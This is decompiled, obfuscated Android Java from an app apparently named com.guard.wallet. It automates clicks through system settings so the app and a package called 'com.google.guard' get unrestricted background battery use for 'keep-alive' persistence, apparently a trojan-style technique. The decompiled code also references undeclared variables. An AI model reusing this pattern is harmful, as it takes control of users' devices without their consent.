package o;

import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.entity.UiObject;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

// $VF: synthetic class
public final class f implements Runnable {
   public final int a;
   public final g b;

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   @Override
   public final void run() {
      int var1 = this.a;
      g var5 = this.b;
      switch (var1) {
         case 0:
            var5.getClass();

            Exception var54;
            label268: {
               UiObject var46;
               try {
                  if (!var5.i0()) {
                     return;
                  }

                  Log.d("o.g", "keepAliveInAppDetail 窗口匹配");
                  com.guard.wallet.helper.g.h(10);
                  var5.G();
                  Log.d("o.g", "active root complete");
                  var46 = var5.Q();
               } catch (Exception var36) {
                  var54 = var36;
                  boolean var74 = false;
                  break label268;
               }

               if (var46 != null) {
                  try {
                     Log.d("o.g", "应用详情窗口滚动视图查找成功");
                     var46 = var5.l0(var46);
                  } catch (Exception var35) {
                     var54 = var35;
                     boolean var75 = false;
                     break label268;
                  }
               } else {
                  UiObject var51;
                  try {
                     Log.e("o.g", "应用详情窗口滚动视图查找失败");
                     var51 = var5.k().findOneByCombine(g.c0());
                  } catch (Exception var34) {
                     var54 = var34;
                     boolean var76 = false;
                     break label268;
                  }

                  var46 = var51;
                  if (var51 == null) {
                     try {
                        var5.k().findOneByCombine(g.f0());
                     } catch (Exception var33) {
                        var54 = var33;
                        boolean var77 = false;
                        break label268;
                     }

                     var46 = var51;
                  }
               }

               String var49;
               if (var46 != null) {
                  try {
                     var46 = var46.findParentUtilCombine(c.L());
                  } catch (Exception var32) {
                     var54 = var32;
                     boolean var78 = false;
                     break label268;
                  }

                  if (var46 != null) {
                     try {
                        if (var46.click()) {
                           Log.d("o.g", "查找并点击应用的电量管理已完成");
                           com.guard.wallet.helper.g.h(30);
                           return;
                        }
                     } catch (Exception var31) {
                        var54 = var31;
                        boolean var79 = false;
                        break label268;
                     }
                  }

                  var49 = "点击应用的电量管理失败";
               } else {
                  var49 = "查找应用的电量管理失败";
               }

               try {
                  Log.e("o.g", var49);
                  return;
               } catch (Exception var30) {
                  var54 = var30;
                  boolean var80 = false;
               }
            }

            Exception var50 = var54;
            a1.q.s("o.g", var50);
            return;
         case 1:
            var5.getClass();

            Exception var10000;
            label259: {
               UiObject var3;
               try {
                  if (!var5.h0()) {
                     return;
                  }

                  Log.d("o.g", "keepAliveInAppBattery 窗口匹配");
                  com.guard.wallet.helper.g.h(40);
                  var5.G();
                  Log.d("o.g", "active root complete");
                  var3 = var5.k().findOneByOperateOr(g.o0());
               } catch (Exception var29) {
                  var10000 = var29;
                  boolean var10001 = false;
                  break label259;
               }

               ConcurrentLinkedQueue var8;
               label276: {
                  AtomicBoolean var4;
                  AtomicBoolean var6;
                  AtomicBoolean var7;
                  var37 = true;
                  var8 = var5.n;
                  var7 = var5.u;
                  var4 = var5.t;
                  var6 = var5.s;
                  label218:
                  if (var3 != null) {
                     try {
                        com.guard.wallet.helper.g.h(50);
                        var3 = var3.findParentUtilCombine(c.K());
                     } catch (Exception var25) {
                        var10000 = var25;
                        boolean var61 = false;
                        break label259;
                     }

                     String var42;
                     if (var3 == null) {
                        var42 = "查找允许后台耗电无限制失败";
                     } else {
                        try {
                           Log.d("o.g", "查找允许后台耗电无限制成功");
                           com.guard.wallet.helper.g.h(60);
                           if (var3.click()) {
                              Log.d("o.g", "点击允许后台耗电无限制成功");
                              com.guard.wallet.helper.g.h(80);
                              var6.set(true);
                              var4.set(true);
                              var7.set(true);
                              break label218;
                           }
                        } catch (Exception var26) {
                           var10000 = var26;
                           boolean var62 = false;
                           break label259;
                        }

                        var42 = "点击允许后台耗电无限制失败";
                     }

                     try {
                        Log.e("o.g", var42);
                     } catch (Exception var24) {
                        var10000 = var24;
                        boolean var63 = false;
                        break label259;
                     }
                  } else {
                     try {
                        var39 = g.b0();
                     } catch (Exception var23) {
                        var10000 = var23;
                        boolean var55 = false;
                        break label259;
                     }

                     if (var39 != null) {
                        try {
                           com.guard.wallet.helper.g.h(40);
                           var3 = var5.k().findOneByCombine(var39);
                        } catch (Exception var22) {
                           var10000 = var22;
                           boolean var56 = false;
                           break label259;
                        }

                        if (var3 != null) {
                           UiObject var9;
                           try {
                              com.guard.wallet.helper.g.h(40);
                              var9 = var3.findParentUtilCombine(c.K());
                           } catch (Exception var21) {
                              var10000 = var21;
                              boolean var57 = false;
                              break label259;
                           }

                           if (var9 != null) {
                              try {
                                 if (var9.click()) {
                                    break label276;
                                 }
                              } catch (Exception var28) {
                                 var10000 = var28;
                                 boolean var58 = false;
                                 break label259;
                              }
                           }

                           try {
                              if (var3.click()) {
                                 break label276;
                              }
                           } catch (Exception var27) {
                              var10000 = var27;
                              boolean var59 = false;
                              break label259;
                           }
                        }
                     }
                  }

                  label264: {
                     boolean var2;
                     try {
                        Log.d("o.g", "准备保存本地保活策略");
                        if (!var6.get() || !var4.get()) {
                           return;
                        }

                        var2 = var7.get();
                     } catch (Exception var20) {
                        var10000 = var20;
                        boolean var64 = false;
                        break label264;
                     }

                     if (!var2) {
                        return;
                     }

                     AtomicReference var52;
                     try {
                        var52 = var5.r;
                     } catch (Exception var15) {
                        var10000 = var15;
                        boolean var65 = false;
                        break label259;
                     }

                     try {
                        var2 = Objects.equals(var52.get(), r.e.c);
                     } catch (Exception var19) {
                        var10000 = var19;
                        boolean var66 = false;
                        break label264;
                     }

                     try {
                        var43 = r.e.d;
                     } catch (Exception var14) {
                        var10000 = var14;
                        boolean var67 = false;
                        break label259;
                     }

                     label171:
                     if (var2) {
                        label168: {
                           try {
                              var5.n0(MainApplication.getAppContext().getPackageName());
                              var8.clear();
                              var6.set(false);
                              var4.set(false);
                              var7.set(false);
                              if (com.guard.wallet.utils.g.d0("com.google.guard") != null) {
                                 break label168;
                              }
                           } catch (Exception var18) {
                              var10000 = var18;
                              boolean var68 = false;
                              break label264;
                           }

                           var37 = false;
                        }

                        try {
                           if (com.guard.wallet.utils.h.r("com.google.guard")) {
                              break label171;
                           }
                        } catch (Exception var17) {
                           var10000 = var17;
                           boolean var69 = false;
                           break label264;
                        }

                        if (var37) {
                           try {
                              var52.set(var43);
                              com.guard.wallet.utils.g.Z0("com.google.guard");
                              return;
                           } catch (Exception var12) {
                              var10000 = var12;
                              boolean var70 = false;
                              break label264;
                           }
                        }
                     } else {
                        try {
                           if (!Objects.equals(var52.get(), var43)) {
                              return;
                           }

                           var5.n0("com.google.guard");
                        } catch (Exception var16) {
                           var10000 = var16;
                           boolean var71 = false;
                           break label264;
                        }
                     }

                     try {
                        var5.Z();
                        return;
                     } catch (Exception var13) {
                        var10000 = var13;
                        boolean var72 = false;
                     }
                  }

                  Exception var44 = var10000;

                  try {
                     a1.q.s("o.g", var44);
                     return;
                  } catch (Exception var10) {
                     var10000 = var10;
                     boolean var73 = false;
                     break label259;
                  }
               }

               try {
                  var8.remove("keepAliveInAppBattery");
                  com.guard.wallet.helper.g.h(40);
                  return;
               } catch (Exception var11) {
                  var10000 = var11;
                  boolean var60 = false;
               }
            }

            Exception var45 = var10000;
            a1.q.s("o.g", var45);
            return;
         default:
            var5.Z();
      }
   }
}
